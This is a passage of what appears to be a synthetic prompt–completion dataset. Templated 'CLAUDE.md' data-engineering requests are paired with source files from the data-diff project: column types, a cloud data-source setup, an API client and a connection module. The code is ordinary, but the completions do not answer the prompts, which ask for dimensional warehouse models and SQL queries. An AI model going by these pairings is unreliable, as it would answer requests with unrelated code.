Python type of the key\"\n\n    def make_value(self, value):\n        if isinstance(value, self.python_type):\n            return value\n        return self.python_type(value)\n\n\n@attrs.define(frozen=True)\nclass Decimal(FractionalType, IKey):  # Snowflake may use Decimal as a key\n    @property\n    def python_type(self) -> type:\n        if self.precision == 0:\n            return int\n        return decimal.Decimal\n\n\n@attrs.define(frozen=True)\nclass StringType(ColType):\n    python_type = str\n    collation: Optional[Collation] = attrs.field(default=None, kw_only=True)\n\n\n@attrs.define(frozen=True)\nclass ColType_UUID(ColType, IKey):\n    python_type = ArithUUID\n\n\n@attrs.define(frozen=True)\nclass ColType_Alphanum(ColType, IKey):\n    python_type = ArithAlphanumeric\n\n\n@attrs.define(frozen=True)\nclass Native_UUID(ColType_UUID):\n    pass\n\n\n@attrs.define(frozen=True)\nclass String_UUID(ColType_UUID, StringType):\n    # Case is important for UUIDs stored as regular string, not native UUIDs stored as numbers.\n    # We slice them internally as numbers, but render them back to SQL as lower/upper case.\n    # None means we do not know for sure, behave as with False, but it might be unreliable.\n    lowercase: Optional[bool] = None\n    uppercase: Optional[bool] = None\n\n    def make_value(self, v: str) -> ArithUUID:\n        return self.python_type(v, lowercase=self.lowercase, uppercase=self.uppercase)\n\n\n@attrs.define(frozen=True)\nclass String_Alphanum(ColType_Alphanum, StringType):\n    @staticmethod\n    def test_value(value: str) -> bool:\n        try:\n            ArithAlphanumeric(value)\n            return True\n        except ValueError:\n            return False\n\n\n@attrs.define(frozen=True)\nclass String_VaryingAlphanum(String_Alphanum):\n    pass\n\n\n@attrs.define(frozen=True)\nclass String_FixedAlphanum(String_Alphanum):\n    length: int\n\n    def make_value(self, value):\n        if isinstance(value, self.python_type):\n            return value\n        if len(value) != self.length:\n            raise ValueError(f\"Expected alphanumeric value of length {self.length}, but got '{value}'.\")\n        return self.python_type(value, max_len=self.length)\n\n\n@attrs.define(frozen=True)\nclass Text(StringType):\n    @property\n    def supported(self) -> bool:\n        return False\n\n\n# In majority of DBMSes, it is called JSON/JSONB. Only in Snowflake, it is OBJECT.\n@attrs.define(frozen=True)\nclass JSON(ColType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass Array(ColType):\n    item_type: ColType\n\n\n# Unlike JSON, structs are not free-form and have a very specific set of fields and their types.\n# We do not parse & use those fields now, but we can do this later.\n# For example, in BigQuery:\n# - https://cloud.google.com/bigquery/docs/reference/standard-sql/data-types#struct_type\n# - https://cloud.google.com/bigquery/docs/reference/standard-sql/lexical#struct_literals\n@attrs.define(frozen=True)\nclass Struct(ColType):\n    pass\n\n\n@attrs.define(frozen=True)\nclass Integer(NumericType, IKey):\n    precision: int = 0\n    python_type: type = int\n\n    def __attrs_post_init__(self) -> None:\n        assert self.precision == 0\n\n\n@attrs.define(frozen=True)\nclass UnknownColType(ColType):\n    text: str\n\n    @property\n    def supported(self) -> bool:\n        return False\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": "data_diff/abcs/database_types.py", "language": "python", "complexity": "complex", "star_count": 2981, "quality_score": 0.84, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nimport time\nfrom typing import List, Optional, Union, overload\n\nimport pydantic\nimport rich\nfrom rich.table import Table\nfrom rich.prompt import Confirm, Prompt, FloatPrompt, IntPrompt, InvalidResponse\nfrom typing_extensions import Literal\n\nfrom data_diff.cloud.datafold_api import (\n    DatafoldAPI,\n    TCloudApiDataSourceConfigSchema,\n    TCloudApiDataSource,\n    TDsConfig,\n    TestDataSourceStatus,\n)\nfrom data_diff.dbt_parser import DbtParser\n\n\nUNKNOWN_VALUE = \"unknown_value\"\n\n\nclass TDataSourceTestStage(pydantic.BaseModel):\n    name: str\n    status: TestDataSourceStatus\n    description: str = \"\"\n\n\nclass TemporarySchemaPrompt(Prompt):\n    response_type = str\n\n    def process_response(self, value: str) -> str:\n        \"\"\"Convert choices to a bool.\"\"\"\n\n        if len(value.split(\".\")) != 2:\n            raise InvalidResponse(\"Temporary schema should have a format <database>.<schema>\")\n        return value\n\n\nclass ValueRequiredPrompt(Prompt):\n    def process_response(self, value: str) -> str:\n        value = super().process_response(value)\n        if value == UNKNOWN_VALUE or value is None or value == \"\":\n            raise InvalidResponse(\"Parameter must not be empty\")\n        return value\n\n\ndef _validate_temp_schema(temp_schema: str) -> None:\n    if len(temp_schema.split(\".\")) != 2:\n        raise ValueError(\"Temporary schema should have a format <database>.<schema>\")\n\n\ndef _get_temp_schema(dbt_parser: DbtParser, db_type: str) -> Optional[str]:\n    config = dbt_parser.get_datadiff_config()\n    config_prod_database = config.prod_database\n    config_prod_schema = config.prod_schema\n    if config_prod_database is not None and config_prod_schema is not None:\n        temp_schema = f\"{config_prod_database}.{config_prod_schema}\"\n        if db_type == \"snowflake\":\n            return temp_schema.upper()\n        elif db_type in {\"pg\", \"postgres_aurora\", \"postgres_aws_rds\", \"redshift\"}:\n            return temp_schema.lower()\n        return temp_schema\n    return\n\n\ndef create_ds_config(\n    ds_config: TCloudApiDataSourceConfigSchema,\n    data_source_name: str,\n    dbt_parser: Optional[DbtParser] = None,\n) -> TDsConfig:\n    options = _parse_ds_credentials(ds_config=ds_config, only_basic_settings=True, dbt_parser=dbt_parser)\n\n    temp_schema = _get_temp_schema(dbt_parser=dbt_parser, db_type=ds_config.db_type) if dbt_parser else None\n    if temp_schema:\n        temp_schema = TemporarySchemaPrompt.ask(\"Temporary schema\", default=temp_schema)\n    else:\n        temp_schema = TemporarySchemaPrompt.ask(\"Temporary schema (<database>.<schema>)\")\n\n    float_tolerance = FloatPrompt.ask(\"Float tolerance\", default=0.000001)\n\n    return TDsConfig(\n        name=data_source_name,\n        type=ds_config.db_type,\n        temp_schema=temp_schema,\n        float_tolerance=float_tolerance,\n        options=options,\n    )\n\n\n@overload\ndef _cast_value(value: str, type_: Literal[\"integer\"]) -> int: ...\n\n\n@overload\ndef _cast_value(value: str, type_: Literal[\"boolean\"]) -> bool: ...\n\n\n@overload\ndef _cast_value(value: str, type_: Literal[\"string\"]) -> str: ...\n\n\ndef _cast_value(value: str, type_: str) -> Union[bool, int, str]:\n    if type_ == \"integer\":\n        return int(value)\n    elif type_ == \"boolean\":\n        return bool(value)\n    return value\n\n\ndef _get_data_from_bigquery_json(path: str):\n    with open(path, \"r\") as file:\n        return json.load(file)\n\n\ndef _align_dbt_cred_params_with_datafold_params(dbt_creds: dict) -> dict:\n    db_type = dbt_creds[\"type\"]\n    if db_type == \"bigquery\":\n        method = dbt_creds[\"method\"]\n        if method == \"service-account\":\n            data = _get_data_from_bigquery_json(path=dbt_creds[\"keyfile\"])\n            dbt_creds[\"jsonKeyFile\"] = json.dumps(data)\n        elif method == \"service-account-json\":\n            dbt_creds[\"jsonKeyFile\"] = json.dumps(dbt_creds[\"keyfile_json\"])\n        else:\n            rich.print(\n                f'[red]Cannot extract bigquery credentials from dbt_project.yml for \"{method}\" type. '\n                f\"If you want to provide credentials via dbt_project.yml, \"\n                f'please, use \"service-account\" or \"service-account-json\" '\n                f\"(more in docs: https://docs.getdbt.com/reference/warehouse-setups/bigquery-setup). \"\n                f\"Otherwise, you can provide a path to a json key file or a json key file data as an input.\"\n            )\n        dbt_creds[\"projectId\"] = dbt_creds[\"project\"]\n    elif db_type == \"snowflake\":\n        dbt_creds[\"default_db\"] = dbt_creds[\"database\"]\n    elif db_type == \"databricks\":\n        dbt_creds[\"http_password\"] = dbt_creds[\"token\"]\n        dbt_creds[\"database\"] = dbt_creds.get(\"catalog\")\n    return dbt_creds\n\n\ndef _parse_ds_credentials(\n    ds_config: TCloudApiDataSourceConfigSchema, only_basic_settings: bool = True, dbt_parser: Optional[DbtParser] = None\n):\n    creds = {}\n    use_dbt_data = False\n    if dbt_parser is not None:\n        use_dbt_data = Confirm.ask(\"Would you like to extract database credentials from dbt profiles.yml?\")\n        try:\n            creds = dbt_parser.get_connection_creds()[0]\n            creds = _align_dbt_cred_params_with_datafold_params(dbt_creds=creds)\n        except Exception as e:\n            rich.print(f\"[red]Cannot parse database credentials from dbt profiles.yml. Reason: {e}\")\n\n    ds_options = {}\n    basic_required_fields = set(ds_config.config_schema.required)\n    for param_name, param_data in ds_config.config_schema.properties.items():\n        if only_basic_settings and param_name not in basic_required_fields:\n            continue\n\n        default_value = param_data.get(\"default\", UNKNOWN_VALUE)\n        is_password = bool(param_data.get(\"format\"))\n\n        title = param_data[\"title\"]\n        type_ = param_data[\"type\"]\n        input_values = {\n            \"prompt\": title,\n            \"password\": is_password,\n        }\n        if default_value != UNKNOWN_VALUE:\n            input_values[\"default\"] = default_value\n\n        if use_dbt_data:\n            value = creds.get(param_name, UNKNOWN_VALUE)\n            if value == UNKNOWN_VALUE:\n                rich.print(f'[red]Cannot extract \"{param_name}\" from dbt profiles.yml. Please, type it manually')\n            else:\n                ds_options[param_name] = _cast_value(value, type_)\n                continue\n\n        if type_ == \"integer\":\n            value = IntPrompt.ask(**input_values)\n        elif type_ == \"boolean\":\n            value = Confirm.ask(title)\n        else:\n            value = ValueRequiredPrompt.ask(**input_values)\n\n        ds_options[param_name] = value\n    return ds_options\n\n\ndef _check_data_source_exists(\n    data_sources: List[TCloudApiDataSource],\n    data_source_name: str,\n) -> Optional[TCloudApiDataSource]:\n    for ds in data_sources:\n        if ds.name == data_source_name:\n            return ds\n    return None\n\n\ndef _test_data_source(api: DatafoldAPI, data_source_id: int, timeout: int = 64) -> List[TDataSourceTestStage]:\n    job_id = api.test_data_source(data_source_id)\n\n    checked_tests = {\"connection\", \"temp_schema\", \"schema_download\"}\n    seconds = 1\n    start = time.monotonic()\n    results = []\n    while True:\n        tests = api.check_data_source_test_results(job_id)\n        for test in tests:\n            if test.name not in checked_tests:\n                continue\n\n            if test.status == \"done\":\n                checked_tests.remove(test.name)\n                results.append(\n                    TDataSourceTestStage(name=test.name, status=test.result.status, description=test.result.message)\n                )\n\n        if not checked_tests:\n            break\n\n        if time.monotonic() - start > timeout:\n            for test_name in checked_tests:\n                results.append(\n                    TDataSourceTestStage(\n                        name=test_name,\n                        status=TestDataSourceStatus.SKIP,\n                        description=f\"Does not complete in {timeout} seconds\",\n                    )\n                )\n            break\n        time.sleep(seconds)\n        seconds *= 2\n\n    return results\n\n\ndef _render_data_source(data_source: TCloudApiDataSource, title: str = \"\") -> None:\n    table = Table(title=title, min_width=80)\n    table.add_column(\"Parameter\", justify=\"center\", style=\"cyan\")\n    table.add_column(\"Value\", justify=\"center\", style=\"magenta\")\n    table.add_row(\"ID\", str(data_source.id))\n    table.add_row(\"Name\", data_source.name)\n    table.add_row(\"Type\", data_source.type)\n    rich.print(table)\n\n\ndef _render_available_data_sources(data_source_schema_configs: List[TCloudApiDataSourceConfigSchema]) -> None:\n    config_names = [ds_config.name for ds_config in data_source_schema_configs]\n\n    table = Table()\n    table.add_column(\"\", justify=\"center\", style=\"cyan\")\n    table.add_column(\"Available data sources\", style=\"magenta\")\n    for i, db_type in enumerate(config_names, start=1):\n        table.add_row(str(i), db_type)\n    rich.print(table)\n\n\ndef _render_data_source_test_results(test_results: List[TDataSourceTestStage]) -> None:\n    table = Table(title=\"Test results\", min_width=80)\n    table.add_column(\n        \"Test\",\n        justify=\"center\",\n        style=\"cyan\",\n    )\n    table.add_column(\"Status\", justify=\"center\", style=\"magenta\")\n    table.add_column(\"Description\", justify=\"center\", style=\"magenta\")\n    for result in test_results:\n        table.add_row(result.name, result.status, result.description)\n    rich.print(table)\n\n\ndef get_or_create_data_source(api: DatafoldAPI, dbt_parser: Optional[DbtParser] = None) -> int:\n    ds_configs = api.get_data_source_schema_config()\n    data_sources = api.get_data_sources()\n\n    _render_available_data_sources(data_source_schema_configs=ds_configs)\n    db_type_num = IntPrompt.ask(\n        prompt=\"What data source type do you want to create? Please, select a number\",\n        choices=list(map(str, range(1, len(ds_configs) + 1))),\n        show_choices=False,\n    )\n\n    ds_config = ds_configs[db_type_num - 1]\n    default_ds_name = ds_config.name\n    rich.print(\"Press enter to accept the (Default value)\")\n    ds_name = Prompt.ask(\"Data source name\", default=default_ds_name)\n\n    ds = _check_data_source_exists(data_sources=data_sources, data_source_name=ds_name)\n    if ds is not None:\n        _render_data_source(data_source=ds, title=f'Found existing data source for name \"{ds.name}\"')\n        use_existing_ds = Confirm.ask(\"Would you like to continue with the existing data source?\")\n        if not use_existing_ds:\n            return get_or_create_data_source(api=api, dbt_parser=dbt_parser)\n        return ds.id\n\n    ds_config = create_ds_config(ds_config=ds_config, data_source_name=ds_name, dbt_parser=dbt_parser)\n    ds = api.create_data_source(ds_config)\n    data_source_url = f\"{api.host}/settings/integrations/dwh/{ds.type}/{ds.id}\"\n    _render_data_source(data_source=ds, title=f\"Created a new data source with ID = {ds.id} ({data_source_url})\")\n\n    rich.print(\n        \"We recommend to run tests for a new data source. \"\n        \"It requires some time but makes sure that the data source is configured correctly.\"\n    )\n    run_tests = Confirm.ask(\"Would you like to run tests?\")\n    if run_tests:\n        test_results = _test_data_source(api=api, data_source_id=ds.id)\n        _render_data_source_test_results(test_results=test_results)\n        if any(result.status == TestDataSourceStatus.FAILED for result in test_results):\n            raise ValueError(\n                f\"Data source tests failed. Please, try to update or test data source in the UI: {data_source_url}\"\n            )\n\n    return ds.id\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": "data_diff/cloud/data_source.py", "language": "python", "complexity": "complex", "star_count": 2981, "quality_score": 0.87, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import base64\nimport enum\nimport time\nfrom typing import Any, Dict, List, Optional, Type, Tuple\n\nimport attrs\nimport pydantic\nimport requests\nfrom typing_extensions import Self\n\nfrom data_diff.errors import DataDiffCloudDiffFailed, DataDiffCloudDiffTimedOut, DataDiffDatasourceIdNotFoundError\nfrom data_diff.utils import getLogger\n\nlogger = getLogger(__name__)\n\n\nclass TestDataSourceStatus(str, enum.Enum):\n    SUCCESS = \"ok\"\n    FAILED = \"error\"\n    SKIP = \"skip\"\n    UNKNOWN = \"unknown\"\n\n\nclass TCloudApiDataSourceSchema(pydantic.BaseModel):\n    title: str\n    properties: Dict[str, Dict[str, Any]]\n    required: List[str]\n    secret: List[str]\n\n    @classmethod\n    def from_orm(cls, obj: Any) -> Self:\n        data_source_types_required_parameters = {\n            \"bigquery\": [\"projectId\", \"jsonKeyFile\", \"location\"],\n            \"databricks\": [\"host\", \"http_password\", \"database\", \"http_path\"],\n            \"mysql\": [\"host\", \"user\", \"passwd\", \"db\"],\n            \"pg\": [\"host\", \"user\", \"port\", \"password\", \"dbname\"],\n            \"postgres_aurora\": [\"host\", \"user\", \"port\", \"password\", \"dbname\"],\n            \"postgres_aws_rds\": [\"host\", \"user\", \"port\", \"password\", \"dbname\"],\n            \"redshift\": [\"host\", \"user\", \"port\", \"password\", \"dbname\"],\n            \"snowflake\": [\"account\", \"user\", \"password\", \"warehouse\", \"role\", \"default_db\"],\n        }\n\n        return cls(\n            title=obj[\"configuration_schema\"][\"title\"],\n            properties=obj[\"configuration_schema\"][\"properties\"],\n            required=data_source_types_required_parameters[obj[\"type\"]],\n            secret=obj[\"configuration_schema\"][\"secret\"],\n        )\n\n\nclass TCloudApiDataSourceConfigSchema(pydantic.BaseModel):\n    name: str\n    db_type: str\n    config_schema: TCloudApiDataSourceSchema\n\n\nclass TCloudApiDataSource(pydantic.BaseModel):\n    id: Optional[int] = None\n    name: str\n    type: str\n    is_paused: Optional[bool] = False\n    hidden: Optional[bool] = False\n    temp_schema: Optional[str] = None\n    disable_schema_indexing: Optional[bool] = False\n    disable_profiling: Optional[bool] = False\n    catalog_include_list: Optional[str] = None\n    catalog_exclude_list: Optional[str] = None\n    schema_indexing_schedule: Optional[str] = None\n    schema_max_age_s: Optional[int] = None\n    profile_schedule: Optional[str] = None\n    profile_exclude_list: Optional[str] = None\n    profile_include_list: Optional[str] = None\n    discourage_manual_profiling: Optional[bool] = False\n    lineage_schedule: Optional[str] = None\n    float_tolerance: Optional[float] = 0.0\n    options: Optional[Dict[str, Any]] = None\n    queue_name: Optional[str] = None\n    scheduled_queue_name: Optional[str] = None\n    groups: Optional[Dict[int, bool]] = None\n    view_only: Optional[bool] = False\n    created_from: Optional[str] = None\n    source: Optional[str] = None\n    max_allowed_connections: Optional[int] = None\n    last_test: Optional[Any] = None\n    secret_id: Optional[int] = None\n\n\nclass TDsConfig(pydantic.BaseModel):\n    name: str\n    type: str\n    temp_schema: str\n    float_tolerance: float = 0.0\n    options: Dict[str, Any]\n    disable_schema_indexing: bool = True\n    disable_profiling: bool = True\n\n\nclass TCloudApiDataDiff(pydantic.BaseModel):\n    data_source1_id: int\n    data_source2_id: int\n    table1: List[str]\n    table2: List[str]\n    pk_columns: List[str]\n    filter1: Optional[str] = None\n    filter2: Optional[str] = None\n    include_columns: Optional[List[str]]\n    exclude_columns: Optional[List[str]]\n\n\nclass TCloudApiOrgMeta(pydantic.BaseModel):\n    org_id: int\n    org_name: str\n    user_id: int\n\n\nclass TSummaryResultPrimaryKeyStats(pydantic.BaseModel):\n    total_rows: Tuple[int, int]\n    nulls: Tuple[int, int]\n    dupes: Tuple[int, int]\n    exclusives: Tuple[int, int]\n    distincts: Tuple[int, int]\n\n\nclass TSummaryResultColumnDiffStats(pydantic.BaseModel):\n    column_name: str\n    match: float\n\n\nclass TSummaryResultValueStats(pydantic.BaseModel):\n    total_rows: int\n    rows_with_differences: int\n    total_values: int\n    compared_columns: int\n    columns_with_differences: int\n    columns_diff_stats: List[TSummaryResultColumnDiffStats]\n\n\nclass TSummaryResultSchemaStats(pydantic.BaseModel):\n    columns_mismatched: Tuple[int, int]\n    column_type_mismatches: int\n    column_reorders: int\n    column_counts: Tuple[int, int]\n    column_type_differs: List[str]\n    exclusive_columns: Tuple[List[str], List[str]]\n\n\nclass TSummaryResultDependencyDetails(pydantic.BaseModel):\n    deps: Dict[str, List[Dict]]\n\n\nclass TCloudApiDataDiffSummaryResult(pydantic.BaseModel):\n    status: str\n    pks: Optional[TSummaryResultPrimaryKeyStats]\n    values: Optional[TSummaryResultValueStats]\n    schema_: Optional[TSummaryResultSchemaStats]\n    deps: Optional[TSummaryResultDependencyDetails]\n\n    @classmethod\n    def from_orm(cls, obj: Any) -> Self:\n        pks = TSummaryResultPrimaryKeyStats(**obj[\"pks\"]) if \"pks\" in obj else None\n        values = TSummaryResultValueStats(**obj[\"values\"]) if \"values\" in obj else None\n        deps = TSummaryResultDependencyDetails(**obj[\"dependencies\"]) if \"dependencies\" in obj else None\n        schema = TSummaryResultSchemaStats(**obj[\"schema\"]) if \"schema\" in obj else None\n        return cls(\n            status=obj[\"status\"],\n            pks=pks,\n            values=values,\n            schema_=schema,\n            deps=deps,\n        )\n\n\nclass TCloudDataSourceTestResult(pydantic.BaseModel):\n    status: TestDataSourceStatus\n    message: str\n    outcome: str\n\n\nclass TCloudApiDataSourceTestResult(pydantic.BaseModel):\n    name: str\n    status: str\n    result: Optional[TCloudDataSourceTestResult]\n\n\n@attrs.define(frozen=False)\nclass DatafoldAPI:\n    api_key: str\n    headers: str = \"\"\n    host: str = \"https://app.datafold.com\"\n    timeout: int = 30\n\n    def __attrs_post_init__(self) -> None:\n        self.host = self.host.rstrip(\"/\")\n        self.headers = {\n            \"Authorization\": f\"Key {self.api_key}\",\n            \"Content-Type\": \"application/json\",\n        }\n\n    def make_get_request(self, url: str) -> Any:\n        rv = requests.get(url=f\"{self.host}/{url}\", headers=self.headers, timeout=self.timeout)\n        rv.raise_for_status()\n        return rv\n\n    def make_post_request(self, url: str, payload: Any) -> Any:\n        rv = requests.post(url=f\"{self.host}/{url}\", headers=self.headers, json=payload, timeout=self.timeout)\n        rv.raise_for_status()\n        return rv\n\n    def get_data_sources(self) -> List[TCloudApiDataSource]:\n        rv = self.make_get_request(url=\"api/v1/data_sources\")\n        rv.raise_for_status()\n        return [TCloudApiDataSource(**item) for item in rv.json()]\n\n    def get_data_source(self, data_source_id: int) -> TCloudApiDataSource:\n        rv = self.make_get_request(url=f\"api/v1/data_sources\")\n        rv.raise_for_status()\n        response_json = rv.json()\n        datasource = next((datasource for datasource in response_json if datasource[\"id\"] == data_source_id), None)\n        if not datasource:\n            raise DataDiffDatasourceIdNotFoundError(\n                f\"Datasource ID: {data_source_id} was not found in your Datafold account!\"\n            )\n        return TCloudApiDataSource(**datasource)\n\n    def create_data_source(self, config: TDsConfig) -> TCloudApiDataSource:\n        payload = config.dict()\n        if config.type == \"bigquery\":\n            json_string = payload[\"options\"][\"jsonKeyFile\"].encode(\"utf-8\")\n            payload[\"options\"][\"jsonKeyFile\"] = base64.b64encode(json_string).decode(\"utf-8\")\n        rv = self.make_post_request(url=\"api/v1/data_sources\", payload=payload)\n        return TCloudApiDataSource(**rv.json())\n\n    def get_data_source_schema_config(\n        self,\n        only_important_properties: bool = False,\n    ) -> List[TCloudApiDataSourceConfigSchema]:\n        rv = self.make_get_request(url=\"api/v1/data_sources/types\")\n        return [\n            TCloudApiDataSourceConfigSchema(\n                name=item[\"name\"],\n                db_type=item[\"type\"],\n                config_schema=TCloudApiDataSourceSchema.from_orm(obj=item),\n            )\n            for item in rv.json()\n        ]\n\n    def create_data_diff(self, payload: TCloudApiDataDiff) -> int:\n        rv = self.make_post_request(url=\"api/v1/datadiffs\", payload=payload.dict())\n        return rv.json()[\"id\"]\n\n    def poll_data_diff_results(self, diff_id: int) -> TCloudApiDataDiffSummaryResult:\n        summary_results = None\n        start_time = time.monotonic()\n        sleep_interval = 3\n        max_sleep_interval = 20\n        max_wait_time = 300\n\n        diff_url = f\"{self.host}/datadiffs/{diff_id}/overview\"\n        while not summary_results:\n            logger.debug(\"Polling Datafold for results...\")\n            response = self.make_get_request(url=f\"api/v1/datadiffs/{diff_id}/summary_results\")\n            response_json = response.json()\n            if response_json[\"status\"] == \"success\":\n                summary_results = response_json\n            elif response_json[\"status\"] == \"failed\":\n                raise DataDiffCloudDiffFailed(f\"Diff failed: {str(response_json)}\")\n\n            if time.monotonic() - start_time > max_wait_time:\n                raise DataDiffCloudDiffTimedOut(\n                    f\"Timed out waiting for diff results. Please, go to the UI for details: {diff_url}\"\n                )\n\n            time.sleep(sleep_interval)\n            sleep_interval = min(sleep_interval + 1, max_sleep_interval)\n\n        return TCloudApiDataDiffSummaryResult.from_orm(summary_results)\n\n    def test_data_source(self, data_source_id: int) -> int:\n        rv = self.make_post_request(f\"api/v1/data_sources/{data_source_id}/test\", {})\n        return rv.json()[\"job_id\"]\n\n    def check_data_source_test_results(self, job_id: int) -> List[TCloudApiDataSourceTestResult]:\n        rv = self.make_get_request(f\"api/v1/data_sources/test/{job_id}\")\n        return [\n            TCloudApiDataSourceTestResult(\n                name=item[\"step\"],\n                status=item[\"status\"],\n                result=TCloudDataSourceTestResult(\n                    status=item[\"result\"][\"code\"].lower(),\n                    message=item[\"result\"][\"message\"],\n                    outcome=item[\"result\"][\"outcome\"],\n                )\n                if item[\"result\"] is not None\n                else None,\n            )\n            for item in rv.json()[\"results\"]\n        ]\n\n    def get_org_meta(self) -> TCloudApiOrgMeta:\n        response = self.make_get_request(f\"api/v1/organization/meta\")\n        response_json = response.json()\n        return TCloudApiOrgMeta(\n            org_id=response_json[\"org_id\"], org_name=response_json[\"org_name\"], user_id=response_json[\"user_id\"]\n        )\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": "data_diff/cloud/datafold_api.py", "language": "python", "complexity": "complex", "star_count": 2981, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from data_diff.databases.base import MD5_HEXDIGITS, CHECKSUM_HEXDIGITS, QueryError, ConnectError, BaseDialect, Database\nfrom data_diff.databases.base import CHECKSUM_OFFSET\nfrom data_diff.databases._connect import connect as connect\nfrom data_diff.databases._connect import Connect as Connect\nfrom data_diff.databases.postgresql import PostgreSQL as PostgreSQL\nfrom data_diff.databases.mysql import MySQL as MySQL\nfrom data_diff.databases.oracle import Oracle as Oracle\nfrom data_diff.databases.snowflake import Snowflake as Snowflake\nfrom data_diff.databases.bigquery import BigQuery as BigQuery\nfrom data_diff.databases.redshift import Redshift as Redshift\nfrom data_diff.databases.presto import Presto as Presto\nfrom data_diff.databases.databricks import Databricks as Databricks\nfrom data_diff.databases.trino import Trino as Trino\nfrom data_diff.databases.clickhouse import Clickhouse as Clickhouse\nfrom data_diff.databases.vertica import Vertica as Vertica\nfrom data_diff.databases.duckdb import DuckDB as DuckDB\nfrom data_diff.databases.mssql import MsSQL as MsSQL\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": "data_diff/databases/__init__.py", "language": "python", "complexity": "simple", "star_count": 2981, "quality_score": 0.6599999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import logging\nfrom typing import Hashable, MutableMapping, Type, Optional, Union, Dict\nfrom itertools import zip_longest\nfrom contextlib import suppress\nimport weakref\n\nimport attrs\nimport dsnparse\nimport toml\n\nfrom typing_extensions import Self\n\nfrom data_diff.databases.base import Database, ThreadedDatabase\nfrom data_diff.databases.postgresql import PostgreSQL\nfrom data_diff.databases.mysql import MySQL\nfrom data_diff.databases.oracle import Oracle\nfrom data_diff.databases.snowflake import Snowflake\nfrom data_diff.databases.bigquery import BigQuery\nfrom data_diff.databases.redshift import Redshift\nfrom data_diff.databases.presto import Presto\nfrom data_diff.databases.databricks import Databricks\nfrom data_diff.databases.trino import Trino\nfrom data_diff.databases.clickhouse import Clickhouse\nfrom data_diff.databases.vertica import Vertica\nfrom data_diff.databases.duckdb import DuckDB\nfrom data_diff.databases.mssql import MsSQL\n\n\n@attrs.frozen\nclass MatchUriPath:\n    database_cls: Type[Database]\n\n    def match_path(self, dsn):\n        help_str = self.database_cls.CONNECT_URI_HELP\n        params = self.database_cls.CONNECT_URI_PARAMS\n        kwparams = self.database_cls.CONNECT_URI_KWPARAMS\n\n        dsn_dict = dict(dsn.query)\n        matches = {}\n        for param, arg in zip_longest(params, dsn.paths):\n            if param is None:\n                raise ValueError(f\"Too many parts to path. Expected format: {help_str}\")\n\n            optional = param.endswith(\"?\")\n            param = param.rstrip(\"?\")\n\n            if arg is None:\n                try:\n                    arg = dsn_dict.pop(param)\n                except KeyError:\n                    if not optional:\n                        raise ValueError(f\"URI must specify '{param}'. Expected format: {help_str}\")\n\n                    arg = None\n\n            assert param and param not in matches\n            matches[param] = arg\n\n        for param in kwparams:\n            try:\n                arg = dsn_dict.pop(param)\n            except KeyError:\n                raise ValueError(f\"URI must specify '{param}'. Expected format: {help_str}\")\n\n            assert param and arg and param not in matches, (param, arg, matches.keys())\n            matches[param] = arg\n\n        for param, value in dsn_dict.items():\n            if param in matches:\n                raise ValueError(\n                    f\"Parameter '{param}' already provided as positional argument. Expected format: {help_str}\"\n                )\n\n            matches[param] = value\n\n        return matches\n\n\nDATABASE_BY_SCHEME = {\n    \"postgresql\": PostgreSQL,\n    \"mysql\": MySQL,\n    \"oracle\": Oracle,\n    \"redshift\": Redshift,\n    \"snowflake\": Snowflake,\n    \"presto\": Presto,\n    \"bigquery\": BigQuery,\n    \"databricks\": Databricks,\n    \"duckdb\": DuckDB,\n    \"trino\": Trino,\n    \"clickhouse\": Clickhouse,\n    \"vertica\": Vertica,\n    \"mssql\": MsSQL,\n}\n\n\n@attrs.define(frozen=False, init=False)\nclass Connect:\n    \"\"\"Provides methods for connecting to a supported database using a URL or connection dict.\"\"\"\n\n    database_by_scheme: Dict[str, Database]\n    conn_cache: MutableMapping[Hashable, Database]\n\n    def __init__(self, database_by_scheme: Dict[str, Database] = DATABASE_BY_SCHEME) -> None:\n        super().__init__()\n        self.database_by_scheme = database_by_scheme\n        self.conn_cache = weakref.WeakValueDictionary()\n\n    def for_databases(self, *dbs) -> Self:\n        database_by_scheme = {k: db for k, db in self.database_by_scheme.items() if k in dbs}\n        return type(self)(database_by_scheme)\n\n    def connect_to_uri(self, db_uri: str, thread_count: Optional[int] = 1, **kwargs) -> Database:\n        \"\"\"Connect to the given database uri\n\n        thread_count determines the max number of worker threads per database,\n        if relevant. None means no limit.\n\n        Parameters:\n            db_uri (str): The URI for the database to connect\n            thread_count (int, optional): Size of the threadpool. Ignored by cloud databases. (default: 1)\n\n        Note: For non-cloud databases, a low thread-pool size may be a performance bottleneck.\n\n        Supported schemes:\n        - postgresql\n        - mysql\n        - oracle\n        - snowflake\n        - bigquery\n        - redshift\n        - presto\n        - databricks\n        - trino\n        - clickhouse\n        - vertica\n        - duckdb\n        \"\"\"\n\n        dsn = dsnparse.parse(db_uri)\n        if len(dsn.schemes) > 1:\n            raise NotImplementedError(\"No support for multiple schemes\")\n        (scheme,) = dsn.schemes\n\n        if scheme == \"toml\":\n            toml_path = dsn.path or dsn.host\n            database = dsn.fragment\n 